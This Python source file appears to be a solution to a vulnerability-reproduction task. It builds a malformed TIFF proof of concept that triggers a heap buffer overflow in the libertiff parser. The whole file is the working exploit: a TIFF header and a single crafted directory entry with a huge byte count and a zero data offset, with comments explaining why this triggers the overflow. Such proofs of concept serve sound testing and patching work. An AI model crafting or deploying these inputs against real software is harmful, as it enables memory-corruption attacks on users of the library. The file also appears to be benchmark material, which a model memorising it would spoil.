import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability in libertiff.
        The vulnerability allows invalid offline tags with a value offset of zero.
        By creating a tag with a large count (offline) and offset 0, we force the parser
        to read/write out of bounds relative to the small file size.
        """
        # TIFF Header (Little Endian)
        # Byte Order: 'II' (0x4949)
        # Magic Number: 42 (0x002A)
        # Offset to first IFD: 8
        header = struct.pack('<2sH I', b'II', 42, 8)
        
        # Image File Directory (IFD)
        # We use a single tag to trigger the vulnerability.
        num_entries = 1
        
        # Malicious Tag Entry (12 bytes)
        # Tag ID: 0xDEAD (Arbitrary unknown tag to force generic data fetching)
        # Type: 1 (BYTE)
        # Count: 0xFFFF (65535) - Large enough to exceed file size and trigger OOB
        # Value/Offset: 0 - This is the trigger. 
        #   Standard TIFF parsers expect offset > 0 for offline data. 
        #   Libertiff with this vulnerability mishandles offset 0.
        tag_entry = struct.pack('<HHII', 0xDEAD, 1, 0xFFFF, 0)
        
        # Offset to next IFD (0 = End)
        next_ifd = struct.pack('<I', 0)
        
        # Construct the minimal PoC
        poc = header + struct.pack('<H', num_entries) + tag_entry + next_ifd
        
        return poc